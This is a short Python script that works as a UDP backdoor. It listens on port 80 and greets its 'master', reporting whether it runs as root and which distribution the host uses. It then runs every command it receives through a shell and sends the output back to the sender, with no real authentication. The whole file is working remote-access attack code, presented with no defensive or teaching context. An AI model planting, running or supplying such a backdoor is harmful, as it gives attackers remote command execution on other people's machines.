#! /usr/bin/python

import socket
import os
import sys
import platform

def launch():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('',80))
    launch = s.recvfrom(1024)
    addr = launch[1][0]
    port = launch[0][0]
    s.sendto('hello master',(addr,port))
    return s,addr, port

s, addr, port = launch()

def getsysinfo():
    que = s.recvfrom(1024)
    prompt = []
    if que[1][0] == addr and que[1][1] == port:
        if os.getuid() == 0:
            prompt.append('root@')
            prompt.append('# ')
        else:
            prompt.append('user@')
            prompt.append('$ ')
        prompt.insert(1,platform.dist()[0])
    s.sendto(''.join(prompt),(addr,port))
    return

getsysinfo()


def shell():
    while 1:
        try:
            command = s.recv(1024)
            if command.strip().split()[0] == 'cd':
                os.chdir(command.strip('cd '))
                s.sendto('Changed Directory',(addr,port))
            elif command.strip() == 'goodbye':
                s.sendto('Goodbye master',(addr,port))
                s.close()
                break
            else:
                proc = os.popen(command)
                output = ''
                for i in proc.readlines():
                    output += i
                    output = output.strip()
                    s.sendto(output,(addr,port))
        except Exception:
            s.sendto('An unexpected error has occured', (addr,port))
            pass

shell()
